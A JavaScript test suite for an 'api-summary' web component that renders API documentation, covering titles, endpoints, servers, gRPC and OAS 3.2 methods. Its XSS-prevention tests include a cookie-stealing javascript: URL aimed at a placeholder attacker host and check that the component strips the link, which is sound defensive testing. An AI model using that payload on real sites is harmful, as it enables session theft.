/* eslint-disable prefer-object-spread */
import { fixture, assert, aTimeout, html, nextFrame } from '@open-wc/testing';
import sinon from 'sinon';
import '../api-summary.js';
import { AmfLoader } from './amf-loader.js';

/** @typedef {import('..').ApiSummary} ApiSummary */

describe('ApiSummary', () => {
  /**
   * @returns {Promise<ApiSummary>}
   */
  async function basicFixture() {
    return fixture(html`<api-summary></api-summary>`);
  }

  /**
   * @returns {Promise<ApiSummary>}
   */
  async function agentFixture() {
    const amf = await AmfLoader.load(false, 'agents-api');
    return fixture(html`<api-summary .amf="${amf}"></api-summary>`);
  }

  /**
   * @param {any} amf
   * @returns {Promise<ApiSummary>}
   */
  async function modelFixture(amf) {
    const element = /** @type ApiSummary */ (await fixture(html`<api-summary .amf="${amf}"></api-summary>`));
    await aTimeout(0);
    return element;
  }

  [
    ['Full AMF model', false],
    ['Compact AMF model', true]
  ].forEach(([label, compact]) => {
    describe(String(label), () => {
      describe('Basic', () => {
        let element = /** @type ApiSummary */ (null);
        let amf;
        before(async () => {
          amf = await AmfLoader.load(compact);
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('renders api title', () => {
          const node = element.shadowRoot.querySelector('[role="heading"]');
          assert.dom.equal(node, `<div aria-level="2" class="api-title" role="heading" part="api-title">
            <label part="api-title-label">
              API title:
            </label>
            <span>
              API body demo
            </span>
          </div>`);
        });

        it('renders version', () => {
          const node = element.shadowRoot.querySelector('.inline-description.version span');
          assert.dom.equal(node, '<span>v1</span>');
        });

        it('renders protocols', () => {
          const node = element.shadowRoot.querySelector('.protocol-chips');
          assert.dom.equal(
            node,
            `<div class="protocol-chips">
            <span class="chip">
                HTTP
            </span>
            <span class="chip">
              HTTPS
            </span>
          </div>`
          );
        });

        it('renders description', () => {
          const node = element.shadowRoot.querySelector('arc-marked .markdown-body');
          const content = node.innerHTML.trim();
          assert.ok(content, 'has description');
          const strong = node.querySelector('strong');
          assert.dom.equal(
            strong,
            '<strong>markdown</strong>',
            { ignoreAttributes: ['class'] },
          );
          const anchor = node.querySelector('a');
          assert.dom.equal(
            anchor,
            '<a>asd</a>',
            { ignoreAttributes: ['class'] },
          );
        });

        it('renders base uri', () => {
          const node = element.shadowRoot.querySelector('api-url');
          assert.equal(node.url, `https://{instance}.domain.com`);
        });

        it('renders endpoints template', () => {
          const node = element.shadowRoot.querySelector('.endpoints-title');
          assert.dom.equal(node, `<label class="endpoints-title section">API endpoints</label>`);
        });
      });

      describe('OAS properties', () => {
        let amf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          amf = await AmfLoader.load(compact, 'loan-microservice');
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
          await nextFrame();
        });

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">John Becker</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:JohnBecker@cognizant.com">
            JohnBecker@cognizant.com
          </a>`
          );
        });

        it('renders provider url', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" href="http://domain.com" target="_blank">http://domain.com</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license link', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
            Apache 2.0
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Prevent XSS attacks', () => {
        let amf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          amf = await AmfLoader.load(compact, 'prevent-xss');
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
            wallythebest@wally.com
          </a>`
          );
        });

        it('renders provider url without malicious href', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" target="_blank">
              javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license without malicious href', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" target="_blank">
            I swear if you click below you will have the most amazing experience ever. I promise.
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Endpoints rendering', () => {
        let element = /** @type ApiSummary */ (null);
        let amf;

        before(async () => {
          amf = await AmfLoader.load(compact);
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('adds separator', () => {
          const node = element.shadowRoot.querySelector('.separator');
          assert.ok(node);
        });

        it('renders all endpoints', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
          assert.lengthOf(nodes, 12);
        });

        it('renders endpoint name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-name');
          assert.dom.equal(
            node,
            `<span class="endpoint-name">People</span>`,
            {
              ignoreAttributes: []
            }
          );
        });

        it('sets data-id on path', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.ok(node.getAttribute('data-id'));
        });

        it('renders endpoint path with name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.dom.equal(node, `<a
            class="endpoint-path"
            data-shape-type="endpoint"
            href="#/people"
            title="Open endpoint documentation"
            >/people</a>`, {
            ignoreAttributes: ['data-id']
          });
        });

        it('renders list of operations', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelectorAll('.method-label');
          assert.lengthOf(nodes, 3);
        });

        it('renders operation method', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.method-label');
          assert.dom.equal(
            node,
            `<a
              class="method-label"
              data-method="get"
              data-shape-type="method"
              href="#/people/get"
              title="Open method documentation"
              >get</a>`,
            {
              ignoreAttributes: ['data-id']
            }
          );
        });

        it('Click on an endpoint dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('Click on an endpoint path dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('Click on a method dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.method-label[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'method');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });
      });

      describe("Endpoints rendering with agents", () => {
        let element = /** @type ApiSummary */ (null);

        beforeEach(async () => {
          element = await agentFixture();
          await aTimeout(0);
        });

        it("renders the list of endpoints", async () => {
          const nodes = element.shadowRoot.querySelectorAll(".endpoint-item");
          assert.lengthOf(nodes, 2);
        });

        it('renders the agent pill', async () => {
          const node = element.shadowRoot.querySelector('.method-icon');
          assert.ok(node);
        });
      });

      describe('Server rendering', () => {
        let ramlSingleServerAmf;
        let oasMultipleServersAmf;
        let oasMultipleServersWithDescriptionAmf;
        let noServersAmf;
        before(async () => {
          ramlSingleServerAmf = await AmfLoader.load(compact);
          oasMultipleServersAmf = await AmfLoader.load(compact, 'multiple-servers');
          oasMultipleServersWithDescriptionAmf = await AmfLoader.load(compact, 'APIC-641');
          noServersAmf = await AmfLoader.load(compact, 'no-server');
        });

        it('renders URL area with a single server', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('api-url');
          assert.ok(node);
        });

        it('renders single server URL', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('api-url');
          assert.equal(node.url, 'https://{instance}.domain.com');
        });

        it('renders multiple servers', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const node = element.shadowRoot.querySelector('.servers');
          assert.ok(node);
        });

        it('renders multiple URLs', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 3, 'has 3 servers');
          assert.equal(nodes[0].textContent.trim(), 'http://petstore.swagger.io/v1');
          assert.equal(nodes[1].textContent.trim(), 'http://dev.petstore.swagger.io/v1');
          assert.equal(nodes[2].textContent.trim(), 'https://{environment}.example.com/v2');
        });

        it('does not render URL area when no servers', async () => {
          const element = await modelFixture(noServersAmf);
          const urlNode = element.shadowRoot.querySelector('.url-area');
          assert.notOk(urlNode);
          const serversNode = element.shadowRoot.querySelector('.servers');
          assert.notOk(serversNode);
        });

        it('renders multiple URLs with descriptions', async () => {
          const element = await modelFixture(oasMultipleServersWithDescriptionAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 4, 'has 4 servers');
          assert.equal(nodes[0].textContent.trim(), 'https://api.aws-west-prd.capgroup.com/cdp-proxy/profiles');
          assert.equal(nodes[0].querySelector('arc-marked').markdown, 'MuleSoft PROD');
          assert.equal(nodes[1].textContent.trim(), 'https://api.aws-west-snp.capgroup.com/cdp-proxy-e2e/profiles');
          assert.equal(nodes[1].querySelector('arc-marked').markdown, 'MuleSoft UAT (for enterprise consumers)');
          assert.equal(nodes[2].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-ite2/profiles');
          assert.equal(nodes[2].querySelector('arc-marked').markdown, 'MuleSoft QA (for enterprise consumers)');
          assert.equal(nodes[3].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-dev2/profiles');
          assert.isUndefined(nodes[3].querySelector('arc-marked').markdown);
        });
      });

      describe('AsyncAPI', () => {
        const asyncApi = 'async-api';
        let asyncAmf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          asyncAmf = await AmfLoader.load(compact, asyncApi);
        });

        beforeEach(async () => {
          element = await modelFixture(asyncAmf);
        });

        it("should render server uri for API", () => {
          assert.equal(
            element.shadowRoot.querySelector(".server-name").textContent,
            "production"
          );
        });

        it('should render "API channels" message', () => {
          assert.equal(element.shadowRoot.querySelector('.section.endpoints-title').textContent, 'API channels');
        });
      });

      describe('hideToc', () => {
        let element = /** @type ApiSummary */ (null);
        beforeEach(async () => {
          element = await basicFixture();
          element.setAttribute('hideToc', 'true');
          await aTimeout(0);
        });

        it('does not render endpoints template', () => {
          const node = element.shadowRoot.querySelector('.toc');
          assert.isNull(node);
        });
      });

      describe('Rendering for library', () => {
        let element = /** @type ApiSummary */ (null);
        let libraryAmf;

        before(async () => {
          libraryAmf = await AmfLoader.load(compact, 'APIC-711');
        });

        beforeEach(async () => {
          element = await basicFixture();
          await nextFrame();
        });

        it('should clear everything when changing to amf for RAML library', async () => {
          const demoAmf = await AmfLoader.load(compact);
          element.amf = demoAmf;
          await nextFrame();
          element.amf = libraryAmf;
          await nextFrame();
          assert.isUndefined(element._apiTitle);
          assert.isUndefined(element._description);
          assert.isUndefined(element._version);
          assert.isUndefined(element._termsOfService);
          assert.isUndefined(element._endpoints);
        });
      });
    });
  });


  describe('_computeBaseUri()', () => {
    let element = /** @type ApiSummary */ (null);
    beforeEach(async () => {
      element = await basicFixture();
    });

    it('calls helper method _getBaseUri()', () => {
      const spy = sinon.spy(element, '_getBaseUri');
      element._computeBaseUri({}, 'https://api.com');
      assert.isTrue(spy.called);
    });

    it('returns a string', () => {
      const result = element._computeBaseUri({}, 'https://api.com/api');
      assert.equal(result, 'https://api.com/api');
    });

    it('removes trailing slash', () => {
      const result = element._computeBaseUri({}, 'https://api.com/');
      assert.equal(result, 'https://api.com');
    });

    it('returns empty string when no info', () => {
      const result = element._computeBaseUri({});
      assert.equal(result, '');
    });
  });

  describe('_computeProvider()', () => {
    let model;
    let element = /** @type ApiSummary */ (null);

    beforeEach(async () => {
      element = await basicFixture();
      model = {
        'http://a.ml/vocabularies/core#provider': [
          {
            '@id': 'amf://id#369',
            '@type': ['http://schema.org/Organization', 'http://a.ml/vocabularies/document#DomainElement'],
            'http://a.ml/vocabularies/core#url': [
              {
                '@id': 'http://domain.com'
              }
            ],
            'http://a.ml/vocabularies/core#name': [
              {
                '@value': 'John Doe'
              }
            ],
            'http://a.ml/vocabularies/core#email': [
              {
                '@value': 'test@mail.com'
              }
            ]
          }
        ]
      };
    });

    it('Computes provider model', () => {
      const result = element._computeProvider(model);
      assert.typeOf(result, 'object');
    });

    it('Removes nested array', () => {
      const p = [Object.assign({}, model['http://a.ml/vocabularies/core#provider'][0])];
      model['http://a.ml/vocabularies/core#provider'][0] = p;
      const result = element._computeProvider(model);
      assert.typeOf(result, 'object');
    });
  });

  describe('Tags-based endpoint grouping', () => {
    [
      ['Full AMF model', false],
      ['Compact AMF model', true]
    ].forEach(([label, compact]) => {
      describe(String(label), () => {
        let element = /** @type ApiSummary */ (null);
        let amf;

        before(async () => {
          amf = await AmfLoader.load(compact, 'tags-flights');
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('renders all endpoints grouped by tags', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
          assert.lengthOf(nodes, 2, 'Should have 2 endpoint groups');
        });

        it('renders first endpoint with tag name "AllFlights"', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[0].querySelector('.endpoint-name');
          assert.ok(node, 'Should have endpoint name element');
          assert.equal(node.textContent.trim(), 'AllFlights');
        });

        it('renders first endpoint description', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[0].querySelector('.endpoint-description');
          assert.ok(node, 'Should have endpoint description element');
          assert.equal(node.textContent.trim(), 'Operations related to all flights');
        });

        it('renders first endpoint path', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[0].querySelector('.endpoint-path');
          assert.ok(node, 'Should have endpoint path element');
          assert.equal(node.textContent.trim(), '/flights');
        });

        it('renders two operations for first endpoint', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[0].querySelectorAll('.method-label');
          assert.lengthOf(nodes, 2, 'Should have 2 operations (GET, POST)');
        });

        it('renders GET and POST methods for first endpoint', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[0].querySelectorAll('.method-label');
          const methods = Array.from(nodes).map(n => n.textContent.trim());
          assert.include(methods, 'get');
          assert.include(methods, 'post');
        });

        it('renders second endpoint with tag name "OneFlight"', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[1].querySelector('.endpoint-name');
          assert.ok(node, 'Should have endpoint name element');
          assert.equal(node.textContent.trim(), 'OneFlight');
        });

        it('renders second endpoint description', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[1].querySelector('.endpoint-description');
          assert.ok(node, 'Should have endpoint description element');
          assert.equal(node.textContent.trim(), 'Operations related to a single flight');
        });

        it('renders second endpoint path', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[1].querySelector('.endpoint-path');
          assert.ok(node, 'Should have endpoint path element');
          assert.equal(node.textContent.trim(), '/flights/{ID}');
        });

        it('renders one operation for second endpoint', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[1].querySelectorAll('.method-label');
          assert.lengthOf(nodes, 1, 'Should have 1 operation (GET)');
        });

        it('renders GET method for second endpoint', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[1].querySelector('.method-label');
          assert.equal(node.textContent.trim(), 'get');
        });
      });
    });
  });

  describe('a11y', () => {
    let amf;
    let element = /** @type ApiSummary */ (null);

    before(async () => {
      amf = await AmfLoader.load(false, 'loan-microservice');
    });

    beforeEach(async () => {
      element = await basicFixture();
      element.amf = amf;
      await aTimeout(0);
    });

    it('passes accessibility test', async () => {
      await assert.isAccessible(element, {
        ignoredRules: ['color-contrast']
      });
    });
  });

  // gRPC Tests
  [
    ['Full AMF model', false],
  ].forEach(([label, compact]) => {
    describe(`gRPC - ${String(label)}`, () => {
      let element = /** @type ApiSummary */ (null);
      let amf;

      before(async () => {
        amf = await AmfLoader.load(compact, 'grpc-test');
      });

      beforeEach(async () => {
        element = await basicFixture();
        element.amf = amf;
        await aTimeout(0);
      });

      it('renders api title for gRPC', () => {
        const node = element.shadowRoot.querySelector('[role="heading"]');
        assert.ok(node, 'Should have title element');
        const span = node.querySelector('span');
        assert.equal(span.textContent.trim(), 'helloworld');
      });

      it('renders gRPC endpoint', () => {
        const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
        assert.isAtLeast(nodes.length, 1, 'Should have at least 1 endpoint');
      });

      it('detects gRPC operations', () => {
        const endpoint = element._endpoints?.[0];
        assert.ok(endpoint, 'Should have endpoint data');
        const ops = endpoint.ops;
        assert.ok(ops, 'Should have operations');
        assert.isAtLeast(ops.length, 1, 'Should have at least 1 operation');
      });

      it('gRPC operations have correct properties', () => {
        const endpoint = element._endpoints?.[0];
        const ops = endpoint?.ops;
        if (ops && ops.length > 0) {
          const firstOp = ops[0];
          assert.property(firstOp, 'isGrpc', 'Should have isGrpc property');
          assert.property(firstOp, 'grpcStreamType', 'Should have grpcStreamType property');
          assert.property(firstOp, 'grpcStreamTypeDisplay', 'Should have grpcStreamTypeDisplay property');
        }
      });

      it('gRPC stream type defaults to unary', () => {
        const endpoint = element._endpoints?.[0];
        const ops = endpoint?.ops;
        if (ops && ops.length > 0) {
          const firstOp = ops[0];
          // For now, all should be unary since we don't have streaming detection
          assert.equal(firstOp.grpcStreamType, 'unary', 'Should default to unary');
          assert.equal(firstOp.grpcStreamTypeDisplay, 'Unary', 'Should show Unary as display name');
        }
      });

      it('renders gRPC operation with correct display method', () => {
        const methodLabels = element.shadowRoot.querySelectorAll('.method-label');
        if (methodLabels.length > 0) {
          const firstLabel = methodLabels[0];
          const text = firstLabel.textContent.trim();
          // Should show stream type display instead of HTTP method
          assert.ok(text, 'Should have method label text');
        }
      });

      it('extracts gRPC method name from AMF', () => {
        const endpoint = element._endpoints?.[0];
        const ops = endpoint?.ops;
        if (ops && ops.length > 0) {
          const firstOp = ops[0];
          assert.property(firstOp, 'methodName', 'Should have methodName property');
          assert.isString(firstOp.methodName, 'methodName should be a string');
          assert.isNotEmpty(firstOp.methodName, 'methodName should not be empty');
          assert.notEqual(firstOp.methodName, 'Unary', 'methodName should be actual method name, not stream type');
        }
      });

      it('displays stream type in pill and method name outside pill for gRPC', () => {
        const methodName = element.shadowRoot.querySelector('.grpc-method-name');
        const badge = element.shadowRoot.querySelector('.grpc-stream-type');
        const methodLabel = element.shadowRoot.querySelector('.method-label');
        assert.exists(badge, 'Should render stream type inside pill');
        if (methodName) {
          assert.exists(methodName, 'Should render method name');
          assert.isNotEmpty(methodName.textContent.trim(), 'Method name should have content');
          assert.isNull(methodName.closest('a'), 'Method name should be outside the pill (not inside .method-label)');
        }
        const wrapper = element.shadowRoot.querySelector('.method-with-name');
        if (wrapper && methodLabel) {
          assert.equal(wrapper.querySelector('.method-label'), methodLabel, 'Pill should be inside wrapper');
          if (methodName) {
            assert.isTrue(wrapper.contains(methodName), 'Method name should be in same wrapper as pill');
          }
        }
      });

      it('displays stream type badge for gRPC', () => {
        const badge = element.shadowRoot.querySelector('.grpc-stream-type');
        if (badge) {
          assert.exists(badge, 'Should render stream type badge');
          const badgeText = badge.textContent.trim();
          assert.match(badgeText, /^(Unary|Client Streaming|Server Streaming|Bidirectional)$/, 'Badge should contain stream type (no brackets)');
        }
      });

      it('gRPC stream type badges are inside method-label', () => {
        const badges = element.shadowRoot.querySelectorAll('.grpc-stream-type');
        if (badges.length > 0) {
          badges.forEach((badge) => {
            const methodLabel = badge.closest('.method-label');
            assert.exists(methodLabel, 'Each stream type badge should be inside a method-label');
          });
        }
      });

      it('fires api-navigation-selection-changed when clicking gRPC span badge', async () => {
        const span = element.shadowRoot.querySelector('.method-label.grpc-container .grpc-stream-type');
        assert.exists(span, 'Should have a grpc-stream-type span inside grpc-container anchor');

        let firedEvent = null;
        element.addEventListener('api-navigation-selection-changed', (ev) => {
          firedEvent = ev;
        });

        span.click();
        await nextFrame();

        assert.ok(firedEvent, 'api-navigation-selection-changed should have been fired');
        assert.ok(firedEvent.detail.selected, 'Event detail should contain selected id');
        assert.equal(firedEvent.detail.type, 'method', 'Event detail type should be "method"');
      });

      it('fires api-navigation-selection-changed when clicking gRPC anchor directly', async () => {
        const anchor = element.shadowRoot.querySelector('.method-label.grpc-container');
        assert.exists(anchor, 'Should have a grpc-container anchor');

        let firedEvent = null;
        element.addEventListener('api-navigation-selection-changed', (ev) => {
          firedEvent = ev;
        });

        anchor.click();
        await nextFrame();

        assert.ok(firedEvent, 'api-navigation-selection-changed should have been fired');
        assert.ok(firedEvent.detail.selected, 'Event detail should contain selected id');
        assert.equal(firedEvent.detail.type, 'method', 'Event detail type should be "method"');
      });
    });
  });

  describe('OAS 3.2 methods (QUERY, COPY, MOVE)', () => {
    // OAS 3.2 adds the QUERY, COPY and MOVE HTTP methods. The summary renders
    // `data-method` straight from the raw AMF value for HTTP operations, so the
    // color override in Styles.js keys on both casings (e.g. QUERY teal #0F9D9D
    // matches both `[data-method='QUERY']` and `[data-method='query']`; COPY
    // indigo #5c6bc0; MOVE amber #b8860b).

    describe('QUERY (from a real generated OAS 3.2 model)', () => {
      // amf-client-js 5.11 PARSES `query:` from an OAS 3.2 pathItem and emits
      // its method as "QUERY" (upper case), so the QUERY label is driven from a
      // real generated model — demo/oas32-query/oas32-query.yaml.
      let amf;
      let element = /** @type ApiSummary */ (null);

      before(async () => {
        amf = await AmfLoader.load(false, 'oas32-query');
      });

      beforeEach(async () => {
        element = await basicFixture();
        element.amf = amf;
        // `__amfChanged` defers processing through a setTimeout debouncer.
        await aTimeout(0);
        await nextFrame();
      });

      it('renders a QUERY method-label with data-method="QUERY"', () => {
        const methods = Array.from(
          element.shadowRoot.querySelectorAll('.method-label')
        ).map((node) => node.getAttribute('data-method'));
        assert.include(methods, 'QUERY', 'a method-label carries the raw QUERY value');
      });

      it('keeps the raw AMF casing (does not lower-case QUERY)', () => {
        const methods = Array.from(
          element.shadowRoot.querySelectorAll('.method-label')
        ).map((node) => node.getAttribute('data-method'));
        assert.notInclude(methods, 'query', 'QUERY is not silently lower-cased');
      });
    });

    describe('COPY / MOVE (inline AMF fragment — not generatable)', () => {
      // amf-client-js 5.11 REJECTS `copy:`/`move:` in an OAS 3.2 pathItem
      // ("Property 'copy'/'move' not supported in a OAS 3.2 pathItem node") and
      // never emits them into the generated model. An inline AMF fragment is the
      // ONLY way to exercise the COPY/MOVE label color until AMF adds support;
      // do NOT attempt to generate these verbs. This inline expanded model (no
      // `@context`) keeps the test independent of the model generator.
      const DOC = 'http://a.ml/vocabularies/document#Document';
      const ENCODES = 'http://a.ml/vocabularies/document#encodes';
      const WEBAPI = 'http://a.ml/vocabularies/apiContract#WebAPI';
      const ENDPOINT = 'http://a.ml/vocabularies/apiContract#endpoint';
      const ENDPOINT_T = 'http://a.ml/vocabularies/apiContract#EndPoint';
      const OPERATION_T = 'http://a.ml/vocabularies/apiContract#Operation';
      const SUPPORTED_OP = 'http://a.ml/vocabularies/apiContract#supportedOperation';
      const PATH = 'http://a.ml/vocabularies/apiContract#path';
      const METHOD = 'http://a.ml/vocabularies/apiContract#method';

      function buildCopyMoveModel() {
        return {
          '@type': [DOC],
          [ENCODES]: [{
            '@id': 'amf://id#1',
            '@type': [WEBAPI],
            [ENDPOINT]: [{
              '@id': 'amf://id#10',
              '@type': [ENDPOINT_T],
              [PATH]: [{ '@value': '/pets' }],
              [SUPPORTED_OP]: [{
                '@id': 'amf://id#13',
                '@type': [OPERATION_T],
                [METHOD]: [{ '@value': 'COPY' }],
              }, {
                '@id': 'amf://id#14',
                '@type': [OPERATION_T],
                [METHOD]: [{ '@value': 'MOVE' }],
              }],
            }],
          }],
        };
      }

      let element;

      beforeEach(async () => {
        element = await basicFixture();
        element.amf = buildCopyMoveModel();
        // `__amfChanged` defers processing through a setTimeout debouncer.
        await aTimeout(0);
        await nextFrame();
      });

      it('renders COPY and MOVE method-labels with their raw data-method', () => {
        const methods = Array.from(
          element.shadowRoot.querySelectorAll('.method-label')
        ).map((node) => node.getAttribute('data-method'));
        assert.include(methods, 'COPY', 'a method-label carries the raw COPY value');
        assert.include(methods, 'MOVE', 'a method-label carries the raw MOVE value');
      });
    });
  });
});
